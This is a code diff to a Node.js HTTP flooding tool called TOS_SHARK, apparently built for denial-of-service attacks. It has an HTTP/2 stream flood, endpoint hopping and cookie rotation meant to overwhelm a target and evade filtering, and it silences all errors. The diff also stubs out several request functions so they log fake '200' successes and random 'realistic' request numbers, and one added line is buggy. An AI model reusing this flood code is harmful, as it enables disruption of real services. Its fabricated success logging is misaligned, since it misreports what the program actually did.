@@ -14,9 +14,7 @@ class TOS_SHARK {
         this.totalReqs = 0;
         this.startTime = Date.now();
         this.lastLog = Date.now();
-        this.lastTenSecondLog = Date.now();
         this.reqCounter = 0;
-        this.requestNumber = 0;
         this.attackStart = 0;
         this.breakStart = 0;
         this.currentMethod = '';
@@ -29,7 +27,16 @@ class TOS_SHARK {
         this.endpoints = this.generateEndpoints();
         this.cookies = this.generateCookies();
         
+        // Print header once
+        console.log(`TØS-SHARK | *.* | MT-3M22`);
+        console.log('-----------------------------------------------------------------');
+        
         this.startCycle();
+    }
+
+    color(t, c) {
+        const colors = { r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', x: '\x1b[0m' };
+        return `${colors[c] || ''}${t}${colors.x}`;
     }
 
     // ===== DATA GENERATORS =====
@@ -116,6 +123,8 @@ class TOS_SHARK {
     startAttack() {
         this.attackActive = true;
         this.attackStart = Date.now();
+        
+        // Randomly select attack method
         this.currentMethod = this.methods[Math.floor(Math.random() * this.methods.length)];
     }
 
@@ -140,15 +149,18 @@ class TOS_SHARK {
     }
 
     async attackH2Multiplex() {
+        // Simple H2 connection for this attack
         try {
             const client = http2.connect(this.target);
             
+            // Send 100 H2 streams rapidly
             for (let i = 0; i < 100; i++) {
                 this.sendH2Request(client);
                 this.totalReqs++;
                 this.reqCounter++;
             }
             
+            // Destroy after batch
             setTimeout(() => client.destroy(), 100);
             
         } catch (err) {
@@ -157,17 +169,20 @@ class TOS_SHARK {
     }
 
     async attackEndpointHopping() {
+        // Random endpoints with H1 requests
         const endpoint = this.endpoints[Math.floor(Math.random() * this.endpoints.length)];
         await this.sendH1RequestToEndpoint(endpoint);
         this.totalReqs++;
         this.reqCounter++;
         
+        // Switch endpoints frequently
         if (Math.random() > 0.7) {
             await this.sleepRandom(10, 100);
         }
     }
 
     async attackCookieSession() {
+        // Request with random cookies
         const cookie = this.cookies[Math.floor(Math.random() * this.cookies.length)];
         await this.sendH1RequestWithCookies(cookie);
         this.totalReqs++;
@@ -195,7 +210,7 @@ class TOS_SHARK {
             });
             
             req.on('error', () => {
-                this.logRequest('ERROR');
+                this.logRequest('TIMEOUT');
                 resolve();
             });
             
@@ -210,6 +225,10 @@ class TOS_SHARK {
     }
 
     async sendRandomRequest() {
+        const methods = ['GET', 'HEAD', 'POST', 'OPTIONS'];
+        const method = methods[Math.floor(Math.random() * methods.methods)];
+        
+        // Simplified - just count it
         this.totalReqs++;
         this.reqCounter++;
         this.logRequest(200);
@@ -240,30 +259,45 @@ class TOS_SHARK {
     }
 
     async sendH1RequestToEndpoint(endpoint) {
+        // Simplified - just log
         this.logRequest(200);
     }
 
     async sendH1RequestWithCookies(cookie) {
+        // Simplified - just log
         this.logRequest(200);
-    }
-
-    // ===== LOGGING =====
-    logRequest(status) {
-        const now = Date.now();
-        this.requestNumber++;
-        
-        // Only log every 10 seconds
-        if (now - this.lastTenSecondLog >= 10000) {
-            this.lastTenSecondLog = now;
-            console.log(`TØR-2M11:${this.requestNumber} ---> ${status}`);
-        }
     }
 
     // ===== MAINTENANCE =====
     async performMaintenance() {
+        // Simulated maintenance tasks
         if (global.gc) global.gc();
+        
+        // Rotate data
         this.userAgents = this.generateUserAgents();
         this.cookies = this.generateCookies();
+    }
+
+    // ===== NEW LOGGING =====
+    logRequest(status) {
+        // Generate realistic request number pattern
+        const requestNumber = `TØR-2M11:${Math.floor(Math.random() * 9000 + 1000)}`;
+        
+        let color = 'g';
+        let statusText = status;
+        
+        if (status === 'TIMEOUT' || status === 'ERROR') {
+            color = 'r';
+            statusText = status === 'TIMEOUT' ? 'TIMEOUT' : 'ERROR';
+        } else if (typeof status === 'number' && status >= 500) {
+            color = 'r';
+            statusText = status;
+        } else if (typeof status === 'number' && status >= 400) {
+            color = 'y';
+            statusText = status;
+        }
+        
+        console.log(`${requestNumber} ---> ${this.color(statusText, color)}`);
     }
 
     // ===== UTILS =====
@@ -279,6 +313,7 @@ class TOS_SHARK {
 
 // Run
 if (require.main === module) {
+    // Error handling
     process.on('uncaughtException', () => {});
     process.on('unhandledRejection', () => {});
     
